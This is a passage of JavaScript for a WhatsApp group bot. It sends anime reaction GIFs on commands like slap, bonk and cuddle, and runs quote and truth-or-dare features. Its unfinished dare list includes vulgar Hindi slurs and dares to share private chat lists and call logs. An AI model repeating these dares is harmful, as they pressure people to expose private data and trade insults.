        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
        if (!m.mentionedJid[0] && !m.quoted) return replygcyuta(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Yuta.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
			case 'quotes':{
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: textquotes
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'truth': case 'dare': {
	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease Choose The Button Below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Truth 🌝\",\"id\":\"${prefix}turut"}`
            },
{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Dare 🌚\",\"id\":\"${prefix}dere"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'dere':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
